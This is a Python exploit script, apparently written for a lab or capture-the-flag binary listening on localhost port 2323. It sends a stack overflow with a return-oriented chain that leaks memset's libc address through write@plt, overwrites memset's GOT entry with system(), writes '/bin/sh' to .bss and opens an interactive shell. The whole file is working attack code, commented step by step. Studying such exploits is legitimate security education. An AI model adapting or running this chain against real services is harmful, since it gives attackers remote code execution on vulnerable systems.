#!/usr/bin/env python3

from socket import *
from struct import *
import telnetlib

write_plt  = 0x401080           # address of write@plt
read_plt =   0x4010c0           # address of read@plt
memset_plt = 0x4010b0           # address of memset@plt
memset_got = 0x404030           # memset()'s GOT entry
pop3ret    = 0x4011be           # gadget to pop rdi; pop rsi; pop rdx; ret (from helper function)
memset_off = 0x18e900           # memset()'s offset in libc.so.6 (here: __memset_avx2_unaligned)
system_off = 0x055410           # system()'s offset in libc.so.6
writeable  = 0x404058           # location to write "/bin/sh" to (here: location in .bss section)

# Padding
buf = bytearray()
buf += b'A' * 168               # padding to RIP's offset (152 for aligned buffer, 8 for ssize_t b, 8 for saved frame pointer)

# Leak memset()'s libc address using write@plt (memset() is __memset_avx_unaligned() here)
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x1)          # stdout
buf += pack('<Q', memset_got)   # address to read from
buf += pack('<Q', 0x8)          # number of bytes to write to stdout
buf += pack('<Q', write_plt)    # return to write@plt

# Payload for stage 1: overwrite memset()'s GOT entry using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # stdin
buf += pack('<Q', memset_got)   # address to write to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt

# Payload for stage 2: read "/bin/sh" into writeable location using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # junk
buf += pack('<Q', writeable)    # location to write "/bin/sh" to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt

# Payload for stage 3: set RDI to location of "/bin/sh", and call system()
buf += pack('<Q', pop3ret)      # pop rdi; ret
buf += pack('<Q', writeable)    # address of "/bin/sh"
buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', memset_plt)   # return to memset@plt which due to memset@got.plt pointing to system is actually system() now

s = socket(AF_INET, SOCK_STREAM)
s.connect(('127.0.0.1', 2323))

# Stage 1: leak memset address
print(s.recv(1024))             # 'Enter input' prompt
s.send(buf)                     # send buf to overwrite RIP
reply = s.recv(1024)            # receive server reply
print(reply)
d = reply[-8:]                  # we returned to write@plt, so receive the leaked memset() libc address which is the last 8 bytes in the reply

memset_addr = unpack('<Q', d)
print('memset() is at ' + hex(memset_addr[0]))

libc_base = memset_addr[0] - memset_off
print('libc base address is ' + hex(libc_base))

system_addr = libc_base + system_off
print('system() is at ' + hex(system_addr))

# Stage 2: send system()'s address to overwrite memset()'s GOT entry
s.send(pack('<Q', system_addr))

# Stage 3: send "/bin/sh" to writable location
s.send(b'/bin/sh')

# Attach to shell
t = telnetlib.Telnet()
t.sock = s
t.interact()
